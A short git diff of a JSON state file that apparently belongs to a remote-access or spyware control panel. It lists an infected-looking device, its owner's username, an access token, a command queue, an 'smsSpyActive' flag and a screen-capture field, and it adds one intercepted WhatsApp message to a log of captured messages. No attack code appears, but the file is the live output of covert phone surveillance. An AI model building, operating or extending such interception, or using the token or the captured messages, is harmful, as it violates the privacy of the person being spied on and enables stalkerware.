@@ -36,7 +36,7 @@
     "deviceName": "HP-RASKA321-52A8",
     "ownerUsername": "Amsal.sim",
     "token": "729a4fc8ab7614c8892066df29eb7c03",
-    "lastSeen": 1775899166972,
+    "lastSeen": 1775899173428,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-11T09:04:13.167Z",
@@ -52,6 +52,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎» luvyu « (8 pesan): Membalas Anda",
+        "content": "~ ya: fto",
+        "time": "11/04 16:19",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775899174061
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
